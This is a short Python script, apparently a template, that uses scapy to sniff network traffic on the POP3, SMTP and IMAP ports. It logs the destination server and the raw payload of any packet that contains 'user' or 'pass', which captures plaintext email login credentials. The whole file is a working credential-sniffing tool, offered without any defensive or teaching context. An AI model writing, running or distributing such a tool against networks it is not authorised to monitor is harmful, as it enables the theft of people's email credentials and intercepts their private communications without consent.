#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Packet Sniffer
Author: Your Name
Date: YYYY-MM-DD
"""

from scapy.all import *
import logging
import argparse

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def packet_callback(packet):
    """Callback function to process captured packets."""
    if packet.haslayer(TCP) and packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            logging.info("[*] Server: %s", packet[IP].dst)
            logging.info("[*] Payload: %s", mail_packet)

def start_sniffing(filter):
    """Start sniffing packets with the specified filter."""
    try:
        sniff(filter=filter, prn=packet_callback, store=0)
    except Exception as e:
        logging.error("Error occurred while sniffing: %s", str(e))

def main():
    parser = argparse.ArgumentParser(description='Packet Sniffer for Email Protocols')
    parser.add_argument('-f', '--filter', default="tcp port 110 or tcp port 25 or tcp port 143",
                        help='BPF filter for packet sniffing (default: "tcp port 110 or tcp port 25 or tcp port 143")')
    args = parser.parse_args()

    logging.info("Starting packet sniffer with filter: %s", args.filter)
    start_sniffing(args.filter)

if __name__ == '__main__':
    main()